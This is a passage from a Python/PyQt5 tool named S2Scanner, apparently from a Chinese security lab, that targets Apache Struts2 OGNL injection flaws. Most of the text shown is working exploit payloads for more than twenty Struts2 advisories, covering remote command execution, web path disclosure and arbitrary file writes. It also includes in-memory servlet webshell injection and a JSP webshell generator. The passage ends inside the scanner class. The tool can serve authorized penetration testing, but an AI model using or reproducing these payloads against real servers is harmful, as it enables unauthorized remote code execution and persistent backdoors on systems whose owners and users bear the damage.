#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
信安西部-明镜高悬实验室-S2Scanner(v1.0)
软件支持22个漏洞的检测:
GET: S2-003,008,009,013,015,016,019,032,033,037,057,devMode
POST: S2-001,005,007,012,029,045,046,048,053
功能: 漏洞扫描、命令执行、获取Web路径、上传文件、内存马
"""

import sys
import re
import os
import random
import string
import hashlib
import shlex
import base64
import http.client
import urllib3
import time
from urllib.parse import quote, urlparse
from datetime import datetime

import requests

# PyQt5
try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QTabWidget, QTextEdit, QLineEdit, QPushButton, QLabel, QFileDialog,
        QGroupBox, QGridLayout, QCheckBox, QSpinBox, QComboBox, QProgressBar,
        QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox
    )
    from PyQt5.QtCore import Qt, QThread, pyqtSignal
    from PyQt5.QtGui import QFont, QTextCursor
except ImportError:
    print("请安装PyQt5: pip install PyQt5")
    sys.exit(1)

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============== HTTP/1.0 协议设置 ==============
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

DEFAULT_TIMEOUT = 10

DEFAULT_HEADERS = {
    "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Content-Type": "application/x-www-form-urlencoded"
}


# ============== 工具函数 ==============
def get_random_hash(length=8):
    letters = string.ascii_letters + string.digits
    rand = ''.join(random.sample(letters, length))
    return hashlib.md5(rand.encode()).hexdigest()[:8]


def parse_headers(header_str):
    headers = DEFAULT_HEADERS.copy()
    if not header_str:
        return headers
    for line in header_str.strip().split('\n'):
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.strip()] = value.strip()
    return headers


def normalize_url(url):
    url = url.strip()
    if not url:
        return None
    if url.startswith(('http://', 'https://')):
        return url.rstrip('/')
    return 'http://' + url.rstrip('/')


def generate_jsp_shell(password="admin"):
    """生成JSP Webshell"""
    return f'''<%!
    class U extends ClassLoader {{
        U(ClassLoader c) {{ super(c); }}
        public Class g(byte[] b) {{ return super.defineClass(b, 0, b.length); }}
    }}
%>
<%
    String pwd = "{password}";
    String cmd = request.getParameter(pwd);
    if (cmd != null) {{
        Process process = Runtime.getRuntime().exec(cmd);
        java.io.InputStream in = process.getInputStream();
        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));
        String line;
        while ((line = reader.readLine()) != null) {{
            out.println(line);
        }}
        process.waitFor();
    }}
%>'''


# ============== 漏洞配置 ==============
VULN_CONFIG = {
    # GET请求漏洞
    "S2-003": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec"]},
    "S2-008": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec"]},
    "S2-009": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec"]},
    "S2-013": {"method": "GET", "default_data": None, "check_type": "math", "support": ["exec", "webpath"]},
    "S2-015": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec"]},
    "S2-016": {"method": "GET", "default_data": None, "check_type": "math", "support": ["exec", "webpath"]},
    "S2-019": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec", "webpath"]},
    "S2-032": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec", "webpath"]},
    "S2-033": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec"]},
    "S2-037": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec", "webpath"]},
    "S2-057": {"method": "GET", "default_data": None, "check_type": "math", "support": ["exec"]},
    "S2-devMode": {"method": "GET", "default_data": None, "check_type": "netstat", "support": ["exec", "webpath"]},
    # POST请求漏洞
    "S2-001": {"method": "POST", "default_data": "username=test&password={exp}", "check_type": "math", "support": ["exec", "webpath", "upload", "memory"]},
    "S2-005": {"method": "POST", "default_data": "redirect:${exp}", "check_type": "netstat", "support": ["exec", "webpath", "upload", "memory"]},
    "S2-007": {"method": "POST", "default_data": "name=test&email=test@test.com&age={exp}", "check_type": "math", "support": ["exec"]},
    "S2-012": {"method": "POST", "default_data": "name={exp}", "check_type": "math", "support": ["exec"]},
    "S2-029": {"method": "POST", "default_data": "message={exp}", "check_type": "netstat", "support": ["exec"]},
    "S2-045": {"method": "POST", "default_data": None, "content_type_inject": True, "check_type": "netstat", "support": ["exec", "webpath", "upload", "memory"]},
    "S2-046": {"method": "POST", "default_data": None, "check_type": "upload", "support": ["exec", "upload"]},
    "S2-048": {"method": "POST", "default_data": "name={exp}&age=123&__checkbox_bustedBefore=true&description=123", "check_type": "math", "support": ["exec"]},
    "S2-053": {"method": "POST", "default_data": "name={exp}", "check_type": "math", "support": ["exec"]},
}


# ============== 命令执行Payload ==============
EXEC_PAYLOADS = {
    "S2-001": lambda cmd: f"%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D",
    "S2-003": lambda cmd: f"(%27\\u0023mycmd\\u003d\\%27{cmd}\\%27%27)(bla)(bla)&(%27\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)%27)(bla)(bla)&(A)((%27\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())%27)(bla))&(B)((%27\\u0023myres\\u003dnew\\40byte[51020]%27)(bla))&(C)((%27\\u0023mydat.readFully(\\u0023myres)%27)(bla))&(D)((%27\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)%27)(bla))&(%27\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\\u0023myout.getWriter().println(\\u0023mystr)%27)(bla))",
    "S2-005": lambda cmd: f"redirect:${{%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27{cmd}%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}}",
    "S2-007": lambda cmd: f"'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'",
    "S2-008": lambda cmd: f"/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29)",
    "S2-009": lambda cmd: f"(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[({key})(%27meh%27)]",
    "S2-012": lambda cmd: f"%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D",
    "S2-013": lambda cmd: f"%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D",
    "S2-015": lambda cmd: f"%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())%2C%23q%7D",
    "S2-016": lambda cmd: f"redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D",
    "S2-019": lambda cmd: f"debug=command&expression=%23f%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()",
    "S2-029": lambda cmd: f"(%23_memberAccess%5B'allowPrivateAccess'%5D%3Dtrue%2C%23_memberAccess%5B'allowProtectedAccess'%5D%3Dtrue%2C%23_memberAccess%5B'excludedPackageNamePatterns'%5D%3D%23_memberAccess%5B'acceptProperties'%5D%2C%23_memberAccess%5B'excludedClasses'%5D%3D%23_memberAccess%5B'acceptProperties'%5D%2C%23_memberAccess%5B'allowPackageProtectedAccess'%5D%3Dtrue%2C%23_memberAccess%5B'allowStaticMethodAccess'%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))",
    "S2-032": lambda cmd: f"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd={cmd}",
    "S2-033": lambda cmd: f"%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command={cmd}",
    "S2-037": lambda cmd: f"(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command={cmd}",
    "S2-045": lambda cmd: r"%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
    "S2-046": lambda cmd: f"%{{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('{cmd}'.split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}}\\x000",
    "S2-048": lambda cmd: f"name=%{{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}&age=123&__checkbox_bustedBefore=true&description=123",
    "S2-053": lambda cmd: f"%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D'{cmd}').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe'%2C'%2Fc'%2C%23cmd%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A",
    "S2-057": lambda cmd: f"%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D",
    "S2-devMode": lambda cmd: f"?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command={cmd}",
}


# ============== Web路径获取Payload ==============
WEBPATH_PAYLOADS = {
    "S2-001": lambda: "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath('%2F'))%2C%23response.flush()%2C%23response.close()%7D",
    "S2-005": lambda: "redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D",
    "S2-013": lambda: "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D",
    "S2-016": lambda: "redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D",
    "S2-019": lambda: "debug=command&expression=%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding('UTF-8')%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath('%2F'))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()",
    "S2-032": lambda: "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8",
    "S2-037": lambda: "%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f",
    "S2-045": lambda: r"%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
    "S2-devMode": lambda: "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest",
}


# ============== 上传文件Payload ==============
UPLOAD_PAYLOADS = {
    "S2-001": lambda path, content: f"%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23fos%3Dnew%20java.io.FileOutputStream(%23req.getParameter(%22f%22))%2C%23fos.write(%23req.getParameter(%22t%22).getBytes())%2C%23fos.close()%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%22OK%22)%2C%23out.close()%7D&f={path}&t={content}",
    "S2-005": lambda path, content: f"redirect:${{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23fos%3dnew%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23out%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23out.println(%22OK%22),%23out.close()}}&f={path}&t={content}",
    "S2-045": lambda path, content: r"%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter('f')),#fos.write(#req.getParameter('t').getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println('OK'),(#outstr.close()))}&f=" + quote(path) + "&t=" + quote(content),
}


# ============== 内存马Payload ==============
MEMORY_PAYLOADS = {
    "S2-001": lambda: "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23class%3D%23req.getClass()%2C%23method%3D%23class.getDeclaredMethod(%22getWrapper%22%2Cnull)%2C%23method.setAccessible(true)%2C%23req%3D%23method.invoke(%23req%2Cnull)%2C%23class%3D%23req.getClass()%2C%23method%3D%23class.getDeclaredMethod(%22getRequest%22%2Cnull)%2C%23method.setAccessible(true)%2C%23req%3D%23method.invoke(%23req%2Cnull)%2C%23class%3D%23req.getClass()%2C%23method%3D%23class.getDeclaredMethod(%22getServletContext%22%2Cnull)%2C%23method.setAccessible(true)%2C%23context%3D%23method.invoke(%23req%2Cnull)%2C%23class%3D%23context.getClass()%2C%23method%3D%23class.getDeclaredMethod(%22addServlet%22%2Cjava.lang.String.class%2Cjavax.servlet.Servlet.class)%2C%23method.setAccessible(true)%2C%23method.invoke(%23context%2C%22MemShell%22%2Cnew%20javax.servlet.http.HttpServlet()%7Bpublic%20void%20service(javax.servlet.http.HttpServletRequest%20req%2Cjavax.servlet.http.HttpServletResponse%20res)%20throws%20java.io.IOException%7Btry%7Bjava.lang.Runtime.getRuntime().exec(req.getParameter(%22cmd%22))%3B%7Dcatch(Exception%20e)%7B%7D%7D%7D)%7D",
    "S2-005": lambda: "redirect:${{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23class%3d%23req.getClass(),%23method%3d%23class.getDeclaredMethod('getWrapper',null),%23method.setAccessible(true),%23req%3d%23method.invoke(%23req,null),%23class%3d%23req.getClass(),%23method%3d%23class.getDeclaredMethod('getRequest',null),%23method.setAccessible(true),%23req%3d%23method.invoke(%23req,null),%23class%3d%23req.getClass(),%23method%3d%23class.getDeclaredMethod('getServletContext',null),%23method.setAccessible(true),%23context%3d%23method.invoke(%23req,null),%23class%3d%23context.getClass(),%23method%3d%23class.getDeclaredMethod('addServlet',java.lang.String.class,javax.servlet.Servlet.class),%23method.setAccessible(true),%23method.invoke(%23context,'MemShell',new%20javax.servlet.http.HttpServlet(){public%20void%20service(javax.servlet.http.HttpServletRequest%20req,javax.servlet.http.HttpServletResponse%20res)%20throws%20java.io.IOException{try{java.lang.Runtime.getRuntime().exec(req.getParameter('cmd'));}catch(Exception%20e){}}})}}",
    "S2-045": lambda: r"%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#class=#req.getClass()).(#method=#class.getDeclaredMethod('getWrapper',null)).(#method.setAccessible(true)).(#req=#method.invoke(#req,null)).(#class=#req.getClass()).(#method=#class.getDeclaredMethod('getRequest',null)).(#method.setAccessible(true)).(#req=#method.invoke(#req,null)).(#class=#req.getClass()).(#method=#class.getDeclaredMethod('getServletContext',null)).(#method.setAccessible(true)).(#context=#method.invoke(#req,null)).(#class=#context.getClass()).(#method=#class.getDeclaredMethod('addServlet',java.lang.String.class,javax.servlet.Servlet.class)).(#method.setAccessible(true)).(#method.invoke(#context,'MemShell',new javax.servlet.http.HttpServlet(){public void service(javax.servlet.http.HttpServletRequest req,javax.servlet.http.HttpServletResponse res) throws java.io.IOException{try{java.lang.Runtime.getRuntime().exec(req.getParameter('cmd'));}catch(Exception e){}}}))}",
}


# ============== HTTP客户端 ==============
class HTTPClient:
    def __init__(self):
        self.session = requests.Session()
        self.proxies = None
        self.timeout = DEFAULT_TIMEOUT
    
    def set_proxy(self, proxy):
        if proxy:
            self.proxies = {'http': proxy, 'https': proxy}
        else:
            self.proxies = None
    
    def set_timeout(self, timeout):
        self.timeout = timeout
    
    def get(self, url, headers=None, encoding='utf-8'):
        try:
            resp = self.session.get(url, headers=headers, proxies=self.proxies,
                                    timeout=self.timeout, verify=False)
            content = resp.content
            try:
                return content.decode(encoding)
            except UnicodeDecodeError:
                return content.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"ERROR:{str(e)}"
    
    def post(self, url, data=None, headers=None, encoding='utf-8'):
        try:
            resp = self.session.post(url, data=data, headers=headers, proxies=self.proxies,
                                     timeout=self.timeout, verify=False)
            content = resp.content
            try:
                return content.decode(encoding)
            except UnicodeDecodeError:
                return content.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"ERROR:{str(e)}"
    
    def upload(self, url, files, headers=None):
        try:
            resp = self.session.post(url, files=files, headers=headers, proxies=self.proxies,
                                     timeout=self.timeout, verify=False)
            return resp.text
        except Exception as e:
            return f"ERROR:{str(e)}"


# ============== 漏洞检测类 ==============
class VulnScanner:
    def __init__(self, url, vuln_name, custom_data=None, headers=None, encoding='utf-8', timeout=10, proxy=None):
        self.vuln_name = vuln_name
        self.config = VULN_CONFIG.get(vuln_name, {})
        self.encoding = encoding
        self.timeout = timeout
        self.proxy = proxy
        self.is_vul = False
        self.url = normalize_url(url)
        
        self.headers = DEFAULT_HEADERS.copy()
        if headers:
            self.headers.update(headers)
        
        if custom_data:
            self.data = custom_data
        else:
